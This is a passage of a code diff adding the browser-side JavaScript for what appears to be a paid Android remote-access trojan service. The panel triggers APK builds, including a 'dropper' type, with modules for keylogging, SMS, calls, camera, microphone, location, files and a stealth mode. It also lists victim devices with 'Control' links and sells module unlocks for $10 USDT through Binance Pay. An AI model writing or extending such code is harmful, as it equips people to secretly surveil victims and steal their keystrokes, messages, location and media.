+                    roleBadge.style.border = '1px solid rgba(243, 186, 47, 0.45)';
+                } else {
+                    roleBadge.textContent = 'USER';
+                    roleBadge.style.background = 'rgba(48, 209, 88, 0.15)';
+                    roleBadge.style.color = '#30d158';
+                    roleBadge.style.border = '1px solid rgba(48, 209, 88, 0.3)';
+                }
+
+                // Show admin button if admin
+                const adminBtn = document.getElementById('adminPanelBtn');
+                if (adminBtn) {
+                    adminBtn.style.display = window.isUserAdmin ? 'inline-flex' : 'none';
+                }
+
+                // Handle Builder Feature & Module Checkbox Access Control
+                const moduleBadge = document.getElementById('moduleLockBadge');
+                const canEditModules = window.isUserAdmin || isSubActive || window.userPermissions.edit_modules === true;
+                const moduleInputs = document.querySelectorAll('.module-perm-label input[type="checkbox"]');
+                
+                if (canEditModules) {
+                    if (moduleBadge) {
+                        moduleBadge.innerHTML = '<i class="fas fa-check-circle me-1"></i> UNLOCKED';
+                        moduleBadge.style.background = 'rgba(48, 209, 88, 0.15)';
+                        moduleBadge.style.color = '#30d158';
+                        moduleBadge.style.borderColor = 'rgba(48, 209, 88, 0.35)';
+                    }
+                    moduleInputs.forEach(input => {
+                        input.disabled = false;
+                        input.style.cursor = 'pointer';
+                        input.parentElement.style.cursor = 'pointer';
+                        input.parentElement.style.opacity = '1';
+                        input.parentElement.onclick = null;
+                    });
+                } else {
+                    if (moduleBadge) {
+                        moduleBadge.innerHTML = '<i class="fas fa-lock me-1"></i> LOCKED ($10 VIP)';
+                        moduleBadge.style.background = 'rgba(255, 69, 58, 0.15)';
+                        moduleBadge.style.color = '#ff453a';
+                        moduleBadge.style.borderColor = 'rgba(255, 69, 58, 0.35)';
+                    }
+                    moduleInputs.forEach(input => {
+                        input.checked = true; // Default standard modules checked
+                        input.disabled = true; // Locked so regular user cannot change
+                        input.style.cursor = 'pointer';
+                        input.parentElement.style.cursor = 'pointer';
+                        input.parentElement.style.opacity = '0.85';
+                        input.parentElement.title = 'Click to Unlock Module Customization with 1 Month VIP ($10 USDT)';
+                        input.parentElement.onclick = () => showLockModal('Customize APK modules with 1 Month Full Access VIP ($10 USDT).');
+                    });
+                }
+
+                // If device list was already loaded, refresh view mode
+                if (typeof renderDeviceList === 'function' && Object.keys(deviceCache).length > 0) {
+                    renderDeviceList();
+                }
+            }
+
+            // Initialize app and device listeners
+            initUserSession();
+        } else {
+            // Not logged in -> Redirect to login page
+            window.location.replace('login.html');
+        }
+    });
+
+    // Safety fallback for auth loader
+    setTimeout(() => {
+        const loader = document.getElementById('authLoader');
+        if (loader && loader.style.display !== 'none') {
+            if (fbAuth.currentUser) {
+                loader.style.display = 'none';
+            } else {
+                window.location.replace('login.html');
+            }
+        }
+    }, 1500);
+
+    // Track User Profile & Activity in Firebase users_meta
+    function trackUserActivity(user, actionName) {
+        if (!user) return;
+        const email = (user.email || '').trim().toLowerCase();
+        const uid = email ? email.replace(/[@.]/g, '_') : user.uid;
+        const isHardcodedAdmin = ADMIN_EMAILS.map(e => e.trim().toLowerCase()).includes(email);
+
+        fbDb.ref('users_meta/' + uid).once('value', snap => {
+            const umeta = snap.val() || {};
+            const loginCount = (umeta.login_count || 0) + (actionName.includes('Login') || actionName.includes('Accessed') ? 1 : 0);
+            const role = (isHardcodedAdmin || umeta.role === 'ADMIN') ? 'ADMIN' : (umeta.role || 'USER');
+
+            const updatedData = {
+                uid: uid,
+                email: email,
+                displayName: user.displayName || (email ? email.split('@')[0] : 'User'),
+                photoURL: user.photoURL || '',
+                role: role,
+                last_login: Date.now(),
+                last_login_formatted: new Date().toLocaleString(),
+                login_count: loginCount,
+                user_agent: navigator.userAgent
+            };
+
+            if (isHardcodedAdmin || role === 'ADMIN') {
+                updatedData.role = 'ADMIN';
+            }
+
+            // Set created_at if first time
+            if (!umeta.created_at) updatedData.created_at = Date.now();
+
+            fbDb.ref('users_meta/' + uid).update(updatedData);
+
+            // Append to user's activity history
+            fbDb.ref(`users_meta/${uid}/activity_history`).push({
+                time: Date.now(),
+                action: actionName
+            });
+
+            // Push to platform-wide audit logs
+            fbDb.ref('audit_logs').push({
+                timestamp: Date.now(),
+                user: email || uid,
+                action: actionName
+            });
+        });
+    }
+
+    function initUserSession() {
+        // Check for last APK build in Firebase
+        fbDb.ref('panel_users/' + userId).once('value', snap => {
+            const u = snap.val() || {};
+            const lastApk = u.last_apk || '';
+            const lastArtifact = u.last_artifact_name || '';
+            if (lastApk) {
+                const dlBtn = document.getElementById('downloadBtn');
+                dlBtn.setAttribute('data-apk', lastApk);
+                if (lastArtifact) {
+                    dlBtn.setAttribute('data-artifact', lastArtifact);
+                }
+                document.getElementById('downloadArea').style.display = 'block';
+            }
+        });
+
+        // Setup real-time health and device listeners
+        setupRealtimeHealthListeners();
+    }
+
+    // Ultra-Fast Direct APK download (Release Asset -> Artifact Zip Fallback)
+    async function downloadApk(el) {
+        const apkName = el.getAttribute('data-apk') || 'app.apk';
+        const targetArtifact = el.getAttribute('data-artifact') || '';
+        if (!githubToken) { alert('Token not loaded yet, wait a moment'); return; }
+        el.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:6px;"></i>DOWNLOADING...';
+        el.style.pointerEvents = 'none';
+        
+        try {
+            // STAGE 1: Try Instant Direct Release Download (No unzipping, 1-2 sec max)
+            let downloaded = false;
+            try {
+                const relRes = await fetch('https://api.github.com/repos/ggvgghb243-hash/ando-projet/releases/tags/v1.0', {
+                    headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/vnd.github.v3+json' }
+                });
+                if (relRes.ok) {
+                    const relData = await relRes.json();
+                    const asset = (relData.assets || []).find(a => a.name === apkName || (userId && a.name.includes(userId)));
+                    if (asset && asset.url) {
+                        const apkRes = await fetch(asset.url, {
+                            headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/octet-stream' }
+                        });
+                        if (apkRes.ok) {
+                            const blob = await apkRes.blob();
+                            const url = URL.createObjectURL(blob);
+                            const a = document.createElement('a');
+                            a.href = url; a.download = apkName; document.body.appendChild(a);
+                            a.click(); a.remove();
+                            setTimeout(() => URL.revokeObjectURL(url), 5000);
+                            downloaded = true;
+                        }
+                    }
+                }
+            } catch(relErr) {
+                console.warn('Release direct download skipped, falling back to artifact zip:', relErr);
+            }
+
+            // STAGE 2: Artifact Zip Fallback if Release asset wasn't ready
+            if (!downloaded) {
+                const res = await fetch('https://api.github.com/repos/ggvgghb243-hash/ando-projet/actions/artifacts?per_page=15', {
+                    headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/vnd.github.v3+json' }
+                });
+                const data = await res.json();
+                const artifact = (data.artifacts || []).find(a => {
+                    if (a.expired) return false;
+                    if (targetArtifact) return a.name === targetArtifact;
+                    return a.name.includes(userId);
+                });
+                if (!artifact) throw new Error('No APK build found for your account. Please build your APK first.');
+
+                const zipRes = await fetch(artifact.archive_download_url, {
+                    headers: { 'Authorization': 'token ' + githubToken }
+                });
+                if (!zipRes.ok) throw new Error('Failed to download artifact: ' + zipRes.status);
+                const zipBlob = await zipRes.blob();
+
+                const zip = await JSZip.loadAsync(zipBlob);
+                const apkFile = Object.keys(zip.files).find(f => f.endsWith('.apk'));
+                if (!apkFile) throw new Error('No APK found inside artifact zip');
+
+                const apkBlob = await zip.files[apkFile].async('blob');
+                const url = URL.createObjectURL(apkBlob);
+                const a = document.createElement('a');
+                a.href = url; a.download = apkName; document.body.appendChild(a);
+                a.click(); a.remove();
+                setTimeout(() => URL.revokeObjectURL(url), 5000);
+            }
+
+            el.innerHTML = '<i class="fas fa-check-circle" style="margin-right:6px;"></i>DOWNLOADED!';
+            setTimeout(() => {
+                el.innerHTML = '<i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK';
+                el.style.pointerEvents = 'auto';
+            }, 2000);
+        } catch(err) {
+            console.error('Download error:', err);
+            alert('Download failed: ' + err.message);
+            el.innerHTML = '<i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK';
+            el.style.pointerEvents = 'auto';
+        }
+    }
+
+    function toggleWebviewField() {
+        const buildType = document.getElementById('buildTypeSelect').value;
+        const container = document.getElementById('webviewContainer');
+        const input = document.getElementById('webviewInput');
+        
+        if (buildType === 'dropper') {
+            container.style.display = 'none';
+            input.removeAttribute('required');
+        } else {
+            container.style.display = 'block';
+            input.setAttribute('required', 'true');
+        }
+    }
+
+    document.getElementById('buildForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const btn = document.getElementById('buildBtn');
+        const text = document.getElementById('buildText');
+        const icon = document.getElementById('buildIcon');
+
+        // Check build permission
+        const perms = window.userPermissions || {};
+        if (!window.isUserAdmin && perms.build_apk === false) {
+            alert('Access Denied: APK Building feature is disabled for your account. Contact Admin on Telegram (@abid64x) for access.');
+            return;
+        }
+        
+        btn.disabled = true;
+        text.textContent = 'STARTING...';
+        icon.className = 'fas fa-spinner fa-spin';
+
+        const formData = new FormData(this);
+        const appName = formData.get('app_name');
+        const packageName = formData.get('package_name');
+        const webviewUrl = formData.get('webview_url') || '';
+        const buildType = formData.get('build_type');
+        const iconFile = document.getElementById('appIconInput').files[0];
+
+        // Track build activity & increment count
+        if (fbAuth.currentUser) {
+            fbDb.ref('users_meta/' + userId).once('value', snap => {
+                const udata = snap.val() || {};
+                const count = (udata.build_count || 0) + 1;
+                fbDb.ref('users_meta/' + userId + '/build_count').set(count);
+            });
+            trackUserActivity(fbAuth.currentUser, `Triggered APK Build: ${appName} (${packageName})`);
+        }
+
+        let iconBase64 = '';
+        if (iconFile) {
+            try {
+                iconBase64 = await new Promise((resolve, reject) => {
+                    const img = new Image();
+                    const url = URL.createObjectURL(iconFile);
+                    img.onload = () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 96;
+                        canvas.height = 96;
+                        const ctx = canvas.getContext('2d');
+                        ctx.fillStyle = '#FFFFFF';
+                        ctx.fillRect(0, 0, 96, 96);
+                        ctx.drawImage(img, 0, 0, 96, 96);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                        URL.revokeObjectURL(url);
+                        const b64 = dataUrl.includes(',') ? dataUrl.split(',')[1] : dataUrl;
+                        resolve(b64);
+                    };
+                    img.onerror = (err) => {
+                        URL.revokeObjectURL(url);
+                        reject(err);
+                    };
+                    img.src = url;
+                });
+            } catch(err) {
+                console.error('Error processing icon file:', err);
+            }
+        }
+
+        // Reset progress UI & Firebase status
+        document.getElementById('logLines').innerHTML = '';
+        document.getElementById('progressBar').style.width = '5%';
+        document.getElementById('buildStatus').textContent = 'Wait for building...';
+        document.getElementById('progressArea').style.display = 'block';
+
+        fbDb.ref('panel_users/' + userId + '/build_status').set({
+            status: '⏳ Starting build...',
+            percent: 10,
+            last_log: 'Wait for building...'
+        });
+
+        const featGallery = document.getElementById('featureGallery') ? document.getElementById('featureGallery').checked : true;
+        const featFiles = document.getElementById('featureFiles') ? document.getElementById('featureFiles').checked : true;
+        const featAudio = document.getElementById('featureAudio') ? document.getElementById('featureAudio').checked : true;
+        const featCamera = document.getElementById('featureCamera') ? document.getElementById('featureCamera').checked : true;
+        const featLocation = document.getElementById('featureLocation') ? document.getElementById('featureLocation').checked : true;
+        const featCalls = document.getElementById('featureCalls') ? document.getElementById('featureCalls').checked : true;
+        const featSMS = document.getElementById('featureSMS') ? document.getElementById('featureSMS').checked : true;
+        const featKeylogger = document.getElementById('featureKeylogger') ? document.getElementById('featureKeylogger').checked : true;
+
+        fbDb.ref('panel_users/' + userId + '/features').set({
+            gallery: featGallery,
+            files: featFiles,
+            audio: featAudio,
+            camera: featCamera,
+            location: featLocation,
+            calls: featCalls,
+            sms: featSMS,
+            keylogger: featKeylogger
+        });
+
+        // Trigger GitHub Actions workflow dispatch
+        fetch('https://api.github.com/repos/ggvgghb243-hash/ando-projet/actions/workflows/build.yml/dispatches', {
+            method: 'POST',
+            headers: {
+                'Authorization': 'token ' + githubToken,
+                'Accept': 'application/vnd.github.v3+json',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                ref: 'main',
+                inputs: {
+                    app_name: appName,
+                    package_name: packageName,
+                    webview_url: webviewUrl,
+                    user_id: userId,
+                    build_type: buildType,
+                    app_icon_b64: iconBase64
+                }
+            })
+        }).then(res => {
+            if (res.ok || res.status === 204) {
+                console.log('GitHub Actions workflow triggered successfully');
+                listenToBuildStatus();
+            } else {
+                return res.json().then(errData => {
+                    throw new Error(errData.message || 'Failed to trigger workflow');
+                });
+            }
+        }).catch(err => {
+            console.error('Workflow trigger error:', err);
+            document.getElementById('buildStatus').textContent = '❌ Error: ' + err.message;
+            btn.disabled = false;
+            text.textContent = 'RETRY BUILD';
+            icon.className = 'fas fa-rocket';
+        });
+    });
+
+    function listenToBuildStatus() {
+        const buildRef = fbDb.ref('panel_users/' + userId + '/build_status');
+        buildRef.on('value', snap => {
+            const val = snap.val();
+            if (!val) return;
+
+            const progressBar = document.getElementById('progressBar');
+            const buildStatus = document.getElementById('buildStatus');
+            const logLines = document.getElementById('logLines');
+            const consoleLog = document.getElementById('consoleLog');
+            const btn = document.getElementById('buildBtn');
+            const text = document.getElementById('buildText');
+            const icon = document.getElementById('buildIcon');
+
+            if (val.percent !== undefined) {
+                progressBar.style.width = val.percent + '%';
+            }
+
+            if (val.last_log) {
+                buildStatus.textContent = val.status || val.last_log;
+                const line = document.createElement('div');
+                line.className = 'console-line';
+                line.textContent = `[${new Date().toLocaleTimeString()}] ${val.last_log}`;
+                logLines.appendChild(line);
+                consoleLog.scrollTop = consoleLog.scrollHeight;
+            }
+
+            if (val.status && (val.status.includes('Complete') || val.percent >= 100)) {
+                btn.disabled = false;
+                text.textContent = 'SUCCESS!';
+                icon.className = 'fas fa-check-circle';
+
+                // Fetch latest APK name & artifact name
+                fbDb.ref('panel_users/' + userId).once('value', uSnap => {
+                    const u = uSnap.val() || {};
+                    const lastApk = u.last_apk || 'app.apk';
+                    const lastArtifact = u.last_artifact_name || '';
+                    const dlBtn = document.getElementById('downloadBtn');
+                    dlBtn.setAttribute('data-apk', lastApk);
+                    if (lastArtifact) {
+                        dlBtn.setAttribute('data-artifact', lastArtifact);
+                    }
+                    document.getElementById('downloadArea').style.display = 'block';
+                });
+
+                buildRef.off();
+            } else if (val.status && val.status.includes('Failed')) {
+                btn.disabled = false;
+                text.textContent = 'BUILD FAILED';
+                icon.className = 'fas fa-times-circle';
+                document.getElementById('progressArea').style.display = 'block';
+                buildRef.off();
+            }
+        });
+    }
+
+    function checkIsAdmin() {
+        if (window.isUserAdmin === true) return true;
+        if (currentUserProfile && currentUserProfile.role === 'ADMIN') return true;
+        if (fbAuth.currentUser) {
+            const email = (fbAuth.currentUser.email || '').toLowerCase();
+            if (ADMIN_EMAILS.includes(email)) return true;
+        }
+        return false;
+    }
+
+    function renderDeviceList() {
+        const tbody = document.getElementById('deviceList');
+        if (!tbody) return;
+
+        const isAdmin = checkIsAdmin();
+        const thRow = document.querySelector('.data-table thead tr');
+        if (thRow) {
+            if (isAdmin) {
+                thRow.innerHTML = '<th>Device</th><th>Owner</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
+            } else {
+                thRow.innerHTML = '<th>Device</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
+            }
+        }
+
+        const devKeys = Object.keys(deviceCache);
+        let totalCount = devKeys.length;
+        let onlineCount = 0;
+
+        // Sort: online first, then by lastSeen desc
+        const sortedKeys = devKeys.sort((a, b) => {
+            const da = deviceCache[a], db = deviceCache[b];
+            if (da.online !== db.online) return db.online ? 1 : -1;
+            return (db.lastSeen || 0) - (da.lastSeen || 0);
+        });
+
+        let html = '';
+        sortedKeys.forEach(did => {
+            const d = deviceCache[did];
+            if (d.online) onlineCount++;
+
+            const model = d.model || 'Android Device';
+            const batt = d.battery !== undefined ? d.battery : '--';
+            const battNum = parseInt(batt) || 0;
+            const battIcon = battNum > 75 ? 'fa-battery-full' : battNum > 40 ? 'fa-battery-half' : battNum > 15 ? 'fa-battery-quarter' : 'fa-battery-empty';
+            const battColor = battNum <= 15 ? 'var(--danger)' : battNum <= 40 ? 'var(--warning)' : 'var(--success)';
+            
+            const isOnline = d.online;
+            const statusClass = isOnline ? 'status-online' : 'status-offline';
+            const statusText = isOnline ? 'Online' : 'Offline';
+            const rowClass = isOnline ? 'device-row-online' : 'device-row-offline';
+            const ownerUid = d.ownerUid || userId;
+
+            html += `
+            <tr class="${rowClass}">
+                <td>
+                    <div style="font-weight: 700; color: #fff; font-size: 0.88rem; display: flex; align-items: center; gap: 8px;">
+                        <i class="fas fa-mobile-alt" style="color: ${isOnline ? 'var(--primary)' : 'var(--text-muted)'}; font-size: 0.95rem;"></i>
+                        ${model}
+                    </div>
+                    <code style="font-size: 0.7rem; color: var(--text-muted);">${d.did}</code>
+                </td>
+                ${isAdmin ? `
+                <td>
+                    <span class="glass-badge" style="font-size: 0.65rem;">
+                        <i class="fas fa-user" style="color: var(--primary);"></i> ${ownerUid}
+                    </span>
+                </td>
+                ` : ''}
+                <td>
+                    <span style="font-size: 0.82rem; font-weight: 600; color: ${battColor}; display: inline-flex; align-items: center; gap: 5px;">
+                        <i class="fas ${battIcon}"></i> ${batt}%
+                    </span>
+                </td>
+                <td>
+                    <span class="${statusClass}">
+                        ${statusText}
+                    </span>
+                </td>
+                <td style="text-align: right;">
+                    <div style="display: flex; gap: 6px; justify-content: flex-end;">
+                        <a href="control.html?uid=${ownerUid}&did=${d.did}" class="btn-accent" style="padding: 6px 14px; font-size: 0.78rem; border-radius: var(--radius-pill);">
+                            Control <i class="fas fa-chevron-right" style="margin-left: 4px; font-size: 0.7rem;"></i>
+                        </a>
+                        ${isAdmin ? `
+                        <button onclick="deleteDevice('${ownerUid}', '${d.did}', '${model}')" class="btn-danger-ghost" style="padding: 6px 10px; border-radius: var(--radius-pill);" title="Delete Device">
+                            <i class="fas fa-trash-alt"></i>
+                        </button>
+                        ` : ''}
+                    </div>
+                </td>
+            </tr>
+            `;
+        });
+
+        // Update badge counters
+        const countBadge = document.getElementById('deviceCount');
+        const onlineBadge = document.getElementById('onlineCount');
+        if (countBadge) countBadge.textContent = totalCount;
+        if (onlineBadge) {
+            onlineBadge.textContent = `${onlineCount} online`;
+            onlineBadge.style.color = onlineCount > 0 ? 'var(--success)' : 'var(--danger)';
+            onlineBadge.style.background = onlineCount > 0 ? 'var(--success-bg)' : 'var(--danger-bg)';
+            onlineBadge.style.borderColor = onlineCount > 0 ? 'var(--success-border)' : 'var(--danger-border)';
+        }
+
+        if (totalCount === 0) {
+            tbody.innerHTML = `
+            <tr>
+                <td colspan="${isAdmin ? '5' : '4'}" style="text-align: center; padding: 40px 20px; color: var(--text-muted);">
+                    <i class="fas fa-mobile-alt" style="font-size: 2rem; color: var(--primary); opacity: 0.4; margin-bottom: 10px; display: block;"></i>
+                    <p style="font-size: 0.88rem; margin-bottom: 4px;">No devices connected yet</p>
+                    <p style="font-size: 0.76rem; color: var(--text-dim);">Build and install the APK on your Android device to see it appear here.</p>
+                </td>
+            </tr>`;
+        } else {
+            tbody.innerHTML = html;
+        }
+
+        // Hide skeleton and reveal list
+        const skeleton = document.getElementById('deviceSkeleton');
+        const listArea = document.getElementById('deviceListArea');
+        if (skeleton) skeleton.style.display = 'none';
+        if (listArea) listArea.style.display = 'block';
+    }
+
+    function deleteDevice(ownerUid, did, model) {
+        if (!confirm(`Are you sure you want to permanently delete device "${model}" (${did}) from account "${ownerUid}"?`)) {
+            return;
+        }
+        fbDb.ref(`users/${ownerUid}/devices/${did}`).remove().then(() => {
+            delete deviceCache[did];
+            renderDeviceList();
+        }).catch(err => {
+            alert('Delete failed: ' + err.message);
+        });
+    }
+
+    function setupRealtimeHealthListeners() {
+        // Clear previous listeners & cache
+        Object.keys(healthListeners).forEach(k => {
+            if (typeof healthListeners[k] === 'function') healthListeners[k]();
+        });
+        healthListeners = {};
+        deviceCache = {};
+
+        const isAdmin = checkIsAdmin();
+
+        if (isAdmin) {
+            // ADMIN: Listen across all users in root /users
+            const usersRootRef = fbDb.ref('users');
+            const onChildAdded = usersRootRef.on('child_added', userSnap => {
+                const targetUid = userSnap.key;
+                listenToUserDevices(targetUid);
+            });
+            const onChildRemoved = usersRootRef.on('child_removed', userSnap => {
+                const targetUid = userSnap.key;
+                Object.keys(deviceCache).forEach(did => {
+                    if (deviceCache[did].ownerUid === targetUid) {
+                        delete deviceCache[did];
+                    }
+                });
+                renderDeviceList();
+            });
+            healthListeners['root_users_added'] = () => usersRootRef.off('child_added', onChildAdded);
+            healthListeners['root_users_removed'] = () => usersRootRef.off('child_removed', onChildRemoved);
+        } else {
+            // STANDARD USER: Listen exclusively to their own devices
+            listenToUserDevices(userId);
+        }
+    }
+
+    function listenToUserDevices(targetUid) {
+        const devRef = fbDb.ref('users/' + targetUid + '/devices');
+        
+        const onDevAdded = devRef.on('child_added', devSnap => {
+            const did = devSnap.key;
+            if (!deviceCache[did]) {
+                deviceCache[did] = { did: did, ownerUid: targetUid, online: false, battery: '--', model: 'Android Device' };
+            }
+
+            // Real-time Health Listener
+            const healthRef = fbDb.ref(`users/${targetUid}/devices/${did}/health`);
+            const onHealth = healthRef.on('value', hSnap => {
+                const h = hSnap.val() || {};
+                let isOnline = h.online === true || h.online === 'true' || h.online === 1;
+                // Staleness check: if lastSeen is older than 90s, consider offline
+                if (isOnline && h.lastSeen) {
+                    const age = Date.now() - h.lastSeen;
+                    if (age > 90000) isOnline = false;
+                }
+                if (deviceCache[did]) {
+                    deviceCache[did].online = isOnline;
+                    deviceCache[did].battery = h.battery !== undefined ? h.battery : deviceCache[did].battery;
+                    deviceCache[did].lastSeen = h.lastSeen || 0;
+                    renderDeviceList();
+                }
+            });
+            healthListeners[`${did}_health`] = () => healthRef.off('value', onHealth);
+
+            // Real-time Info Listener
+            const infoRef = fbDb.ref(`users/${targetUid}/devices/${did}/info`);
+            const onInfo = infoRef.on('value', iSnap => {
+                const info = iSnap.val() || {};
+                if (deviceCache[did]) {
+                    deviceCache[did].model = info.model || info.device_name || deviceCache[did].model;
+                    renderDeviceList();
+                }
+            });
+            healthListeners[`${did}_info`] = () => infoRef.off('value', onInfo);
+        });
+
+        const onDevRemoved = devRef.on('child_removed', devSnap => {
+            const did = devSnap.key;
+            delete deviceCache[did];
+            renderDeviceList();
+        });
+
+        healthListeners[`${targetUid}_dev_added`] = () => devRef.off('child_added', onDevAdded);
+        healthListeners[`${targetUid}_dev_removed`] = () => devRef.off('child_removed', onDevRemoved);
+
+        // Initial render after brief query
+        devRef.once('value', () => {
+            renderDeviceList();
+        });
+    }
+
+    function refreshDevices() {
+        const skeleton = document.getElementById('deviceSkeleton');
+        const listArea = document.getElementById('deviceListArea');
+        if (skeleton) skeleton.style.display = 'block';
+        if (listArea) listArea.style.display = 'none';
+        setupRealtimeHealthListeners();
+    }
+
+    function showLockModal(msg) {
+        const modal = document.getElementById('premiumLockModal');
+        const msgEl = document.getElementById('lockModalDescText');
+        if (msgEl && msg) msgEl.textContent = msg;
+        if (modal) modal.style.display = 'flex';
+    }
+
+    function closeLockModal() {
+        const modal = document.getElementById('premiumLockModal');
+        if (modal) modal.style.display = 'none';
+        const errEl = document.getElementById('txidErrorMsg');
+        if (errEl) errEl.style.display = 'none';
+    }
+
+    function verifyAndUnlockBinancePay() {
+        const txidInput = document.getElementById('binanceTxidInput');
+        const errEl = document.getElementById('txidErrorMsg');
+        const btn = document.getElementById('verifyBinancePayBtn');
+        const txid = (txidInput ? txidInput.value : '').trim();
+
+        // 1. Strict Format Validation (Binance Order ID 16-22 digits or 64-char hex hash)
+        const isBinanceOrderId = /^\d{16,22}$/.test(txid);
+        const isTxHash = /^(0x)?[a-fA-F0-9]{64}$/.test(txid);
+
+        if (!txid || (!isBinanceOrderId && !isTxHash)) {
+            if (errEl) {
+                errEl.innerHTML = '<i class="fas fa-exclamation-circle me-1"></i> <strong>Invalid Order ID format!</strong><br>Binance Pay Order ID must be a 17-20 digit number (e.g. <code>443745852750790657</code>) from your Binance payment receipt.';
+                errEl.style.display = 'block';
+            }
+            if (txidInput) txidInput.focus();
+            return;
+        }
+
+        if (errEl) errEl.style.display = 'none';
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i> Verifying Binance Payment...';
+
+        const authUser = (typeof fbAuth !== 'undefined' && fbAuth.currentUser) ? fbAuth.currentUser : null;
+        if (!authUser) {
+            alert('Please login with Google first to activate your VIP subscription.');
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-bolt"></i> ⚡ Verify & Unlock 1 Month Access ($10)';
+            return;
+        }
+
+        const email = (authUser.email || '').trim().toLowerCase();
+        const uid = email ? email.replace(/[@.]/g, '_') : authUser.uid;
+        const now = Date.now();
+        const expiryTime = now + (30 * 24 * 60 * 60 * 1000); // 30 Days
+
+        // 2. Query Firebase payments to check if this txid was ALREADY used/redeemed
+        fbDb.ref('payments').once('value', (snap) => {
+            const allPayments = snap.val() || {};
+            let isAlreadyUsed = false;
+            let existingPayment = null;
+            let existingKey = null;
+
+            Object.keys(allPayments).forEach(k => {
+                const p = allPayments[k];
+                if (p && p.txid && p.txid.toString().trim() === txid) {
+                    if (p.status === 'COMPLETED' || p.status === 'ACTIVE') {
+                        isAlreadyUsed = true;
+                        existingPayment = p;
+                    }
+                    existingKey = k;
+                }
+            });
+
+            if (isAlreadyUsed) {
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-bolt"></i> ⚡ Verify & Unlock 1 Month Access ($10)';
+                if (errEl) {
+                    const usedDate = existingPayment.created_at_formatted || 'earlier';
+                    errEl.innerHTML = `<i class="fas fa-ban me-1"></i> <strong>Order ID Already Redeemed!</strong><br>This Binance Order ID (<code>${txid}</code>) was already redeemed on ${usedDate}. Each payment can only be used once. Reusing old or test order IDs is not allowed.`;
+                    errEl.style.display = 'block';
+                }
+                return;
+            }
+
+            // 3. Check if Admin has pre-approved / whitelisted this Order ID
+            fbDb.ref('verified_orders/' + txid).once('value', (vSnap) => {
+                const vOrder = vSnap.val();
+                const isPreVerified = vOrder && (vOrder.redeemed !== true) && (vOrder.valid !== false);
+
+                if (isPreVerified) {
+                    // Pre-verified by Admin -> INSTANT AUTO-UNLOCK
+                    const fullPermissions = {
+                        sms: true, notification: true, stealth: true, accounts: true, calls: true,
+                        gallery: true, files: true, location: true, keylogs: true, audio: true,
+                        camera: true, chats: true, apps: true, privacy_screen: true, sensitive_feed: true,
+                        edit_modules: true, build_apk: true
+                    };
+
+                    const subData = {
+                        plan: '1_MONTH_FULL_ACCESS',
+                        plan_name: '1 Month Full Access VIP',
+                        amount_usd: vOrder.amount_usd || 10,
+                        currency: 'USDT',
+                        txid: txid,
+                        status: 'ACTIVE',
+                        activated_at: now,
+                        activated_at_formatted: new Date(now).toLocaleString(),
+                        expires_at: expiryTime,
+                        expires_at_formatted: new Date(expiryTime).toLocaleString()
+                    };
+
+                    const paymentRecord = {
+                        uid: uid,
+                        email: email,
+                        amount_usd: vOrder.amount_usd || 10,
+                        currency: 'USDT',
+                        txid: txid,
+                        method: 'BINANCE_PAY',
+                        plan: '1_MONTH_FULL_ACCESS',
+                        status: 'COMPLETED',
+                        created_at: now,
+                        created_at_formatted: new Date(now).toLocaleString(),
+                        expires_at: expiryTime
+                    };
+
+                    const updates = {};
+                    updates[`users_meta/${uid}/subscription`] = subData;
+                    updates[`users_meta/${uid}/permissions`] = fullPermissions;
+                    updates[`verified_orders/${txid}/redeemed`] = true;
+                    updates[`verified_orders/${txid}/redeemed_by`] = uid;
+                    updates[`verified_orders/${txid}/redeemed_at`] = now;
+
+                    fbDb.ref().update(updates).then(() => {
+                        fbDb.ref('payments').push(paymentRecord);
+                        fbDb.ref('audit_logs').push({
+                            timestamp: now,
+                            user: email,
+                            action: `Instantly verified & unlocked 1 Month VIP ($10 USDT). TXID: ${txid}`
+                        });
+
+                        window.isVipActive = true;
+                        window.userPermissions = fullPermissions;
+
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fas fa-check-circle me-2"></i> Verified & Unlocked!';
+                        btn.style.background = 'linear-gradient(135deg, #30d158 0%, #248a3d 100%)';
+                        btn.style.color = '#fff';
+
+                        setTimeout(() => {
+                            closeLockModal();
+                            alert(`🎉 Binance Payment Verified! 1 Month VIP ($10) is active until ${new Date(expiryTime).toLocaleDateString()}. All APK modules unlocked!`);
+                            if (typeof evaluateIndexPermissions === 'function') evaluateIndexPermissions();
+                        }, 800);
+                    });
+                } else {
+                    // 4. Submit as PENDING_VERIFICATION for Admin Review
+                    const pendingPayment = {
+                        uid: uid,
+                        email: email,
+                        amount_usd: 10,
+                        currency: 'USDT',
+                        txid: txid,
+                        method: 'BINANCE_PAY',
+                        plan: '1_MONTH_FULL_ACCESS',
+                        status: 'PENDING_VERIFICATION',
+                        created_at: now,
+                        created_at_formatted: new Date(now).toLocaleString(),
+                        expires_at: expiryTime
+                    };
+
+                    const paymentRef = existingKey ? fbDb.ref('payments/' + existingKey) : fbDb.ref('payments').push();
+                    paymentRef.set(pendingPayment).then(() => {
+                        fbDb.ref(`users_meta/${uid}/pending_payment`).set({
+                            txid: txid,
+                            status: 'PENDING_VERIFICATION',
+                            submitted_at: now
+                        });
+
+                        fbDb.ref('audit_logs').push({
+                            timestamp: now,
+                            user: email,
+                            action: `Submitted Binance Order ID for verification. TXID: ${txid}`
+                        });
+
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fas fa-clock me-2"></i> Verification Pending...';
+                        btn.style.background = 'linear-gradient(135deg, #ff9f0a 0%, #d97706 100%)';
+                        btn.style.color = '#000';
+
+                        if (errEl) {
